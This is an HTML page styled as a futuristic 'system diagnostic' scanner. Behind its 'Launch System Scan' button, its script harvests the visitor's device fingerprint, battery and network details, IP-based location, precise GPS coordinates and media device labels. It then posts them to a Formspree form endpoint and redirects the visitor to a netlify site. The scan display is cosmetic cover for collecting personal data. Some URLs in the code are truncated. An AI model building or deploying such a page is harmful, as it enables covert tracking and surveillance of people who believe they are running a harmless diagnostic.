<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quantum System Diagnostic Matrix</title>
    <style>
        :root {
            --primary: #00ffcc;
            --bg-dark: #0a0f1d;
            --card-bg: rgba(16, 24, 48, 0.75);
            --border: rgba(0, 255, 242, 0.15);
            --text: #e2e8f0;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
            background: linear-gradient(135deg, #050814 0%, #0c1328 100%);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
        }

        .container {
            width: 100%;
            max-width: 800px;
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5), 0 0 30px rgba(0, 255, 204, 0.05);
            transform: translateY(0);
            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            letter-spacing: 2px;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
            margin-bottom: 25px;
            text-transform: uppercase;
        }

        .progress-container {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            height: 6px;
            border-radius: 10px;
            margin-bottom: 25px;
            overflow: hidden;
            position: relative;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00f2fe 0%, #4facfe 100%);
            box-shadow: 0 0 10px #00f2fe;
            transition: width 0.4s ease;
        }

        .console-screen {
            background: #040814;
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            padding: 20px;
            height: 250px;
            overflow-y: auto;
            font-family: 'Courier New', Courier, monospace;
            font-size: 13px;
            color: #a0aec0;
            margin-bottom: 25px;
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.8);
        }

        .log-line {
            margin-bottom: 6px;
            opacity: 0;
            transform: translateX(-10px);
            animation: fadeInLine 0.3s forwards ease-out;
            line-height: 1.4;
        }

        @keyframes fadeInLine {
            to { opacity: 1; transform: translateX(0); }
        }

        .accent-success { color: var(--primary); font-weight: bold; }
        .accent-process { color: #38bdf8; }
        .accent-alert { color: #fbbf24; }
        .accent-fail { color: #f87171; }

        .btn-core {
            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
            color: #040814;
            border: none;
            padding: 16px 24px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            letter-spacing: 1px;
            text-transform: uppercase;
            box-shadow: 0 4px 15px rgba(0, 242, 254, 0.3);
            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .btn-core:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 242, 254, 0.5);
            filter: brightness(1.1);
        }

        .btn-core:active:not(:disabled) {
            transform: translateY(0);
        }

        .btn-core:disabled {
            background: #1e293b;
            color: #64748b;
            box-shadow: none;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="container" id="mainCard">
        <h1 id="panelTitle">Diagnostic Core Interface</h1>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>

        <div class="console-screen" id="consoleDisplay">
            <div class="log-line accent-process">[SYSTEM] Telemetry protocols initialized. Awaiting user ignition sequence...</div>
        </div>

        <button class="btn-core" id="triggerBtn" onclick="initiateDynamicHarvest()">Launch System Scan</button>
    </div>

    <script>
        const consoleDisplay = document.getElementById('consoleDisplay');
        const progressBar = document.getElementById('progressBar');
        const triggerBtn = document.getElementById('triggerBtn');
        const panelTitle = document.getElementById('panelTitle');

        // VERIFIED ACTIVE FORMSPREE ID
        const FORMSPREE_ENDPOINT = 'https://formspree.io';
        const LOCAL_STORAGE_KEY = 'quantum_telemetry_cache';
        const REDIRECT_TARGET = 'https://netlify.app'; 

        let collectedMetrics = {
            hardwareProfile: {},
            screenMatrix: {},
            regionalContext: {},
            storageProfile: {},
            batteryStatus: {},
            networkStatus: {},
            ipLocationData: {},
            hardwareTokens: { geolocation: "Denied/Not Provided", hardwareLabels: [] },
            navigationMapping: {}
        };

        function pushOutput(message, designClass = 'accent-process') {
            const time = new Date().toLocaleTimeString();
            consoleDisplay.innerHTML += `<div class="log-line ${designClass}">[${time}] ${message}</div>`;
            consoleDisplay.scrollTop = consoleDisplay.scrollHeight;
        }

        function updateProgress(percentage) {
            progressBar.style.width = `${percentage}%`;
        }

        async function runBaseExtraction() {
            pushOutput("Gleaning expanded open environment metadata...", "accent-process");
            updateProgress(20);
            
            collectedMetrics.hardwareProfile = {
                userAgent: navigator.userAgent,
                cores: navigator.hardwareConcurrency || "N/A",
                memoryEst: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
                maxTouch: navigator.maxTouchPoints || 0,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false
            };

            collectedMetrics.screenMatrix = {
                bounds: `${screen.width}x${screen.height}`,
                availableViewport: `${window.innerWidth}x${window.innerHeight}`,
                depth: `${screen.colorDepth}-bit`,
                scaleRatio: window.devicePixelRatio || 1
            };

            collectedMetrics.regionalContext = {
                zone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
                locale: navigator.language || "Unknown",
                preferredLanguages: navigator.languages ? navigator.languages.join(', ') : "Unknown"
            };

            if (navigator.storage && navigator.storage.estimate) {
                try {
                    const estimate = await navigator.storage.estimate();
                    collectedMetrics.storageProfile = {
                        quotaMb: Math.round(estimate.quota / (1024 * 1024)),
                        usageMb: Math.round(estimate.usage / (1024 * 1024))
                    };
                } catch(e) { collectedMetrics.storageProfile = "Estimate Denied"; }
            }

            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debug) {
                        collectedMetrics.hardwareProfile.gpuVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
                        collectedMetrics.hardwareProfile.gpuRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) { collectedMetrics.hardwareProfile.gpuInfo = "WebGL Access Failure"; }
            
            pushOutput("Base environmental matrix extracted successfully.", "accent-success");
        }

        async function extractBatteryData() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    collectedMetrics.batteryStatus = {
                        level: `${Math.round(battery.level * 100)}%`,
                        charging: battery.charging ? "Connected (Charging)" : "Discharging"
                    };
                } catch(e) {}
            }
        }

        function extractNetworkData() {
            updateProgress(40);
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            collectedMetrics.networkStatus = {
                online: navigator.onLine,
                effectiveType: connection ? (connection.effectiveType || "Unknown") : "N/A",
                downlink: connection ? (`${connection.downlink} Mbps`) : "N/A"
            };
        }

        async function fetchIPLocationFallback() {
            pushOutput("Executing back-channel IP georouting lookup...", "accent-process");
            updateProgress(60);
            try {
                const response = await fetch('https://ipapi.co');
                if (response.ok) {
                    const data = await response.json();
                    collectedMetrics.ipLocationData = {
                        ip: data.ip, city: data.city, region: data.region, country: data.country_name, postal: data.postal, isp: data.org,
                        googleMapsBackupLink: `https://google.com{data.latitude},${data.longitude}`
                    };
                    pushOutput(`Network routing target located: ${data.city}, ${data.country_name}.`, "accent-success");
                }
            } catch(e) { pushOutput("Back-channel routing lookup offline.", "accent-fail"); }
        }

        async function requestAdvancedTelemetry() {
            updateProgress(80);
            pushOutput("Requesting absolute browser geospatial lock...", "accent-alert");

            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 6000, enableHighAccuracy: true});
                    });
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    collectedMetrics.hardwareTokens.geolocation = `Lat: ${lat}, Lon: ${lon}`;
                    collectedMetrics.navigationMapping = {
                        googleMapsDirectLink: `https://google.com{lat},${lon}`
                    };
                    pushOutput("Exact GPS matrix nodes secured.", "accent-success");
                } catch (err) {
                    pushOutput("GPS grid link restricted by user engine.", "accent-fail");
                }
            }

            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    devices.forEach(device => {
                        if(device.kind) {
                            collectedMetrics.hardwareTokens.hardwareLabels.push(`${device.kind}: ${device.label || 'Protected Device'}`);
                        }
                    });
                } catch (err) {}
            }
        }

        async function dispatchTelemetry() {
            updateProgress(90);
            pushOutput("Transmitting integrated packet data bundle...", "accent-process");

            try {
                const response = await fetch(FORMSPREE_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify({
                        subject: "Quantum Diagnostic Registry Update",
                        metrics: JSON.stringify(collectedMetrics, null, 2)
                    })
                });

                if (response.ok) {
                    updateProgress(100);
                    pushOutput("PAYLOAD DELIVERED. Initializing console transfer...", "accent-success");
                    setTimeout(() => { window.location.href = REDIRECT_TARGET; }, 1200);
                } else { throw new Error("Gateway Refusal"); }
            } catch (error) {
                updateProgress(100);
                pushOutput(`TRANSMISSION FAILURE: ${error.message}`, "accent-fail");
            }
        }

        async function initiateDynamicHarvest() {
            triggerBtn.disabled = true;
            panelTitle.innerText = "Synchronizing Core...";
            triggerBtn.innerText = "Analyzing Matrix...";
            
            await runBaseExtraction();
            await extractBatteryData();
            extractNetworkData();
            await fetchIPLocationFallback();
            await requestAdvancedTelemetry();
            await dispatchTelemetry();
        }
    </script>
</body>
</html>
